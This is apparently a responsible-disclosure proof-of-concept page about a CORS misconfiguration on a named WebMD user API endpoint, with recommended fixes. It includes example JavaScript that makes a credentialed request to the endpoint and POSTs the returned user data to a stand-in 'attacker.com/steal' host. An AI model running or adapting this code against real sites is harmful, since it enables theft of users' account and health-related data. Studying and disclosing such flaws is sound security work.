🔒 WebMD CORS Misconfiguration Vulnerability

Target: https://www.webmd.com/api/reg/regapi.svc/secure/json2/user

⚠️ SECURITY WARNING: This page demonstrates a security vulnerability. Do not use for malicious purposes. This is a proof-of-concept for educational and responsible disclosure only.

📋 Vulnerability Description

The WebMD API endpoint is configured with:

  • Access-Control-Allow-Origin: * (any domain can make requests)
  • Access-Control-Allow-Credentials: true (requests can include cookies/sessions)

This combination violates the CORS security model and allows malicious websites to make authenticated requests to WebMD and read sensitive user data.

🎯 Attack Scenario

How an attacker would exploit this:
  1. User logs into WebMD (gets session cookies)
  2. User visits a malicious website
  3. Malicious site runs JavaScript that makes a request to WebMD API
  4. Browser sends cookies automatically (credentials: 'include')
  5. Malicious site reads the response containing user's sensitive data
  6. Data is exfiltrated to attacker's server

Example Attack Code:

// Malicious JavaScript on attacker.com
fetch('https://www.webmd.com/api/reg/regapi.svc/secure/json2/user', {
    method: 'GET',
    credentials: 'include',  // Sends WebMD session cookies
    headers: {
        'Authorization': 'Bearer [user_token]',
        'Client-Id': '63bc91e1-0492-46eb-bb4a-042d6c924c4b',
        'Enc-Data': '[encrypted_data]',
        'Timestamp': '[timestamp]'
    }
})
.then(response => response.json())
.then(userData => {
    // Send stolen data to attacker server
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(userData)
    });
});

🛡️ Recommended Fix

  • Option 1: Remove Access-Control-Allow-Credentials: true if using wildcard origin
  • Option 2: Replace wildcard origin with specific allowed origins (whitelist)
  • Option 3: Implement proper authentication and CSRF tokens for API requests
  • Option 4: Consider if CORS is needed at all for this endpoint
